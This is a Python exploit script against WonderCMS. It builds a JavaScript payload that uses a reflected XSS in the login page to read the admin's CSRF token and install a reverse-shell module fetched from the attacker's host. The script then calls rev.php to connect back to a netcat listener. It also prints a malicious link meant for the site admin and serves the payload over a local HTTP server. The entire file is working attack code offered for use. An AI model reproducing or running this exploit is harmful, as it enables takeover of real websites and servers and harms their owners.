import sys
import requests
import os

# Ensure BeautifulSoup is imported if needed later.
try:
    from bs4 import BeautifulSoup
except ImportError:
    print("[!] BeautifulSoup is not installed. Install it with 'pip install beautifulsoup4'.")
    sys.exit(1)

# Helper function for printing usage
def print_usage():
    print("Usage: python3 exploit.py <loginURL> <IP_Address> <Port>")
    print("Example: python3 exploit.py http://localhost/wondercms/loginURL 192.168.29.165 5252")

def download_file(url, output_path):
    if os.path.exists(output_path):
        print(f"[+] The file already exists at: {output_path}. It will not be downloaded again.")
        return

    try:
        print(f"[+] Downloading file from {url}")
        response = requests.get(url, stream=True)
        response.raise_for_status()  

        with open(output_path, "wb") as file:
            for chunk in response.iter_content(chunk_size=8192):
                file.write(chunk)

        print(f"[+] [+] File saved to: {output_path}")
    except requests.RequestException as e:
        print(f"[!] Error downloading the file: {e}")


url = "https://github.com/prodigiousMind/revshell/archive/refs/heads/main.zip"
output_path = "revshell-main.zip"
download_file(url, output_path)

# Ensure correct arguments are provided
if len(sys.argv) != 4:
    print_usage()
    sys.exit(1)

# Input arguments
login_url = sys.argv[1]
ip_address = sys.argv[2]
port = sys.argv[3]

# JavaScript payload template
data = f'''
// Exploit script for XSS to RCE
var targetURL = "{login_url}"; 
var token = document.querySelectorAll('[name="token"]')[0].value;
var exploitURL = targetURL + "/?installModule=http://{ip_address}:8000/revshell-main.zip&directoryName=violet&type=themes&token=" + token;

var xhr = new XMLHttpRequest();
xhr.withCredentials = true;
xhr.open("GET", exploitURL);
xhr.send();
xhr.onload = function()
''' + """{"""+ '''
    if (xhr.status == 200) ''' + """{"""+ f'''
        var revShellURL = targetURL +"/themes/revshell-main/rev.php?lhost={ip_address}&lport={port}";
        var xhr2 = new XMLHttpRequest();
        xhr2.withCredentials = true;
        xhr2.open("GET", revShellURL);
        xhr2.send();
        '''+ """
    }
};
"""

try:
    # Write the JavaScript payload to a file
    with open("xss.js", "w") as f:
        f.write(data)
    print("[+] xss.js created successfully.")

    # Provide instructions for the user
    print("[+] Start a listener using the following command:")
    print(f"    nc -lvp {port}")
    
    # Generate the XSS link to send to the admin
    xss_link = (
        f"{login_url.replace('loginURL', 'index.php?page=loginURL?')}\"></form>"
        f"<script src='http://{ip_address}:8000/xss.js'></script><form action=\""
    )
    print("[+] Send the following link to the admin:")
    print(xss_link)

    # Start a simple HTTP server to serve the payload
    print("[+] Starting HTTP server to serve xss.js.")
    os.system("python3 -m http.server 8000")

except Exception as e:
    print(f"[!] An error occurred: {e}")
